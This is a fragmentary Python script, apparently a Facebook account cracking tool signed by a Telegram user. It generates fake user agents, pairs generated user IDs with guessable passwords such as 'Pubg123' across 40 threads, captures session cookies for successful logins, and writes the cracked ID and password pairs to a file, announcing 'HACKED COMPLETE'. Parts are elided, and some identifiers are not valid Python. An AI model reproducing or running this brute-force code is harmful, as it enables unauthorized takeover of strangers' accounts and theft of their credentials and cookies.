...
# Mack By : Jaber Ahmed 
# Telegram Id : JaberAhmed420
# Telegram : https://t.me/JaberAhmed420
...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-open https://t.me/JaberAhmed420")
logo =("""
\033[1;32m     _       _               
\033[1;36m     | | __ _| |__   ___ _ __ 
\033[1;32m  _ | |/ _` | '_ \ / _ \ '__|
\033[1;32m  | |_| | (_| | |_) |  __/ |   
\033[1;32m  \___/ \__,_|_.__/ \___|_|   
\033[1;91m╔═════════════════════════╗
\033[1;92m   	𝙼𝙰𝙲𝙺 𝙱𝚈 𝙹𝙰𝙱𝙴𝚁 𝚅𝙰𝙸
\033[1;91m╚═════════════════════════╝
""") 
...
def 𝙹𝙰𝙱𝙴𝚁():
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    𝙹𝙰𝙱𝙴𝚁 = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if 𝙹𝙰𝙱𝙴𝚁 in ["1","A"]:
        𝙹𝙰𝙱𝙴𝚁s()
    if 𝙹𝙰𝙱𝙴𝚁 in ["2","B"]:
...
def 𝙹𝙰𝙱𝙴𝚁s():
    ...
    with ThreadPool(max_workers=40) as 𝙹𝚊𝚋𝚎𝚛-𝚟𝚊𝚒:
        ...
        print(f'\033[1;91m║\033[1;92m 𝙼𝙰𝙲𝙺 𝙱𝚈 𝙹𝙰𝙱𝙴𝚁 𝚅𝙰𝙸 ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Jaber']
            uid = code+love
            𝙹𝚊𝚋𝚎𝚛-𝚟𝚊𝚒.submit(𝙹𝙰𝙱𝙴𝚁m,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM 𝙹𝙰𝙱𝙴𝚁 ')
    print("\033[1;91m╚═══════════════════════════╝")


def 𝙹𝙰𝙱𝙴𝚁m(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92m𝚂𝙰𝙳-𝙳𝙰𝙳𝚄💔-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/𝙹𝙰𝙱𝙴𝚁-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[𝚂𝙰𝙳-𝙳𝙰𝙳𝚄💔-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
